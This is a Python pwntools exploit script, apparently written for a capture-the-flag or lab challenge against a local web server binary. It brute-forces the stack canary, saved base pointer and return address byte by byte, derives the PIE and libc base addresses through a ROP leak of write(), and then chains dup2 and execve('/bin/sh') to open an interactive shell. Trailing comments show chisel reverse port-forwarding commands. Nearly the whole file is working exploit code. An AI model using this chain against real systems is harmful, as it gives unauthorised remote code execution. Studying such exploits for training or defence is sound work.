from pwn import *
from concurrent.futures import ThreadPoolExecutor

context(os="linux", arch="amd64")

context.log_level = 'error'

RHOST = "localhost"
RPORT = 1338
TIME_OUT = 5
SUCCESS_STRING = "connection closed"


## local path
libc_path = "/lib/x86_64-linux-gnu/libc.so.6"
elf_path = "./webserver"
RPORT = 8036

## remote target
# libc_path = "./libc.so.6.target"
# elf_path = "./target_web"
offset_pie = 0x1701

class Fuzzer:
    def __init__(self, max_workers=24) -> None:

        self.max_workers = max_workers
        self.cur_content = ""

        self.end_pool = False

    def build_bytes(self, payload: str) -> bool:

        if not self.end_pool:
            r = remote(RHOST, RPORT, level="error")
            r.recvline(timeout=TIME_OUT)
            r.send(payload)
            try:
                resp = r.recvline(timeout=TIME_OUT).rstrip().decode()
                if resp == SUCCESS_STRING:
                    r.close()
                    return True
            except:
                pass

            try:
                r.close()
            except:
                pass

        return False

    def _build_bytes_callback(self, fn):
        if fn.result():
            print("Byte Found : ", hex(fn.arg))
            self.cur_content += chr(fn.arg)
            self.end_pool = True

    def fuzz_addr(self, init_payload: str = ""):

        self.init_payload = init_payload
        self.cur_content = ""
        while len(self.cur_content) < 8:
            self.end_pool = False
            ex = ThreadPoolExecutor(max_workers=self.max_workers)
            for byte in range(0x00, 0x100):
                payload = self.init_payload + self.cur_content + chr(byte)
                f = ex.submit(self.build_bytes, payload)
                f.arg = byte
                f.add_done_callback(self._build_bytes_callback)

            while True:
                if self.end_pool:
                    break
                if ex._work_queue.empty() and len(ex._threads) == 0:
                    log.info("failed to build byte")
                    break
                sleep(1)
        return self.cur_content

#### Bruteforcing canary , rbp and pie address ######

# stack_canary = p64(0xe779f8aada764700).decode('latin-1')
# rbp = p64(0x7fffffffde10).decode('latin-1')
# cur_ret = p64(0x5555555556d9).decode('latin-1')

OFFSET = 72
f = Fuzzer(max_workers=5)
stack_canary = f.fuzz_addr(init_payload="A"*72)
print("[+] Canary : ", hex(u64(stack_canary)))

rbp = f.fuzz_addr(init_payload="A"*72+stack_canary)
print("[+] RBP : ", hex(u64(rbp)))

cur_ret = f.fuzz_addr(init_payload="A"*72+stack_canary+rbp)
print("[+] CUR RET : ", hex(u64(cur_ret)))

pie_base = u64(cur_ret) - offset_pie

print("[+]PIE BASE : ", hex(pie_base))

payload_frame = "A"*OFFSET + stack_canary + rbp

#### Creating rop gadgets from binary to get libc address #####
# Rop Gadget :   write(4, elf.got['write'], 0x8)

elf = ELF(elf_path, checksec=False)
elf.address = pie_base
rop_elf = ROP(elf)

rop_elf.write(0x4, elf.got['write'], 0x8)
chain = rop_elf.chain()
chain = chain.decode('latin-1')
print("CHAIN\n", rop_elf.dump())
payload = payload_frame + chain

r = remote(RHOST, RPORT, level="error")
r.recvline(timeout=TIME_OUT)
r.send(payload)
write_libc = u64(r.recv(8))

print("Leaked write Libc : ", hex(write_libc))


libc_elf = ELF(libc_path)
libcwrite_offset_base = libc_elf.sym['write']
libc_base = write_libc - libcwrite_offset_base
print("Libc Base : ", hex(libc_base))
libc_elf.address = libc_base

### Code Execution Rop Gadgets from libc ###

rop_libc = ROP(libc_elf)
binsh_addr = next(libc_elf.search(b"/bin/sh\x00"))

rop_libc.dup2(0x4, 0x0)
rop_libc.dup2(0x4, 0x1)
rop_libc.execve(binsh_addr, 0x0, 0x0)
print("[+] ROP CHAIN\n", rop_libc.dump())

chain = rop_libc.chain()
payload = payload_frame + chain.decode('latin-1')

r = remote(RHOST, RPORT, level="error")
r.recvline(timeout=TIME_OUT)
r.send(payload)
r.interactive()


###### Portforwarding via chisel ######

# chisel server -p 1080 --reverse

# chisel client <server-ip>:1080 R:1338:127.0.0.1:<client-port>

